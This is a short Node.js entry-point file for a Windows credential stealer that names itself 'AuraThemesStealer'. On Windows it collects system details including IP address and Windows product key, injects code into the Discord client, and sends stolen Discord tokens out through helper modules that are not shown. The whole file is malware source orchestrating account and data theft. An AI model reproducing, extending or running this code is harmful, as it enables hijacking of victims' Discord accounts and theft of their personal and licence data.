const process = require("process");
const GET_CONFIG = require("./config/config")();

require("dotenv").config();

switch (process.platform) {
    case "win32":
        const { getInfo } = require("./modules/core/core");
        const { discordInjected } = require("./modules/dinjection/injection");
        const { sendTokens } = require("./modules/findtoken/send");
        const { debuggerx } = require("./modules/debugger/debuggerx");
        const { error } = require("./utils/error");

        class AuraThemesStealer {
            constructor() {
                this.aurita();
            }
            async aurita() {
                try {
                    const { DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION } = await getInfo();
                    await debuggerx(GET_CONFIG.debugger, DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION);
                    await discordInjected(GET_CONFIG.injection);
                    await sendTokens();
                    error();
                } catch (error) {
                    return console.error('An error occurred in main', error);
                }
            }
        }
        new AuraThemesStealer()
        break;
    default:
        break;
}